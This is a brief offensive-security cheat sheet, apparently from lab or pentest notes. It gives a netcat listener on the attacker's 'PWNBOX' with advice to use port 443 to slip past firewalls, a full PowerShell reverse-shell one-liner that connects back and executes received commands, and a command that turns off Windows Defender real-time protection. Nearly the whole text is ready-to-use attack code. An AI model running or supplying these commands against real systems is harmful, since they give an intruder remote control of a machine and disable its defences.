- PWNBOX
```bash
nc -lnvp $PORT
# should use 443 becuase it's a common port, less likely to be blocked by firewall
```
- TARGET
```Command-Prompt
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient($PWNBOX,$PORT);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```
- Disable AV
```PowerShell
Set-MpPreference -DisableRealtimeMonitoring $true
```
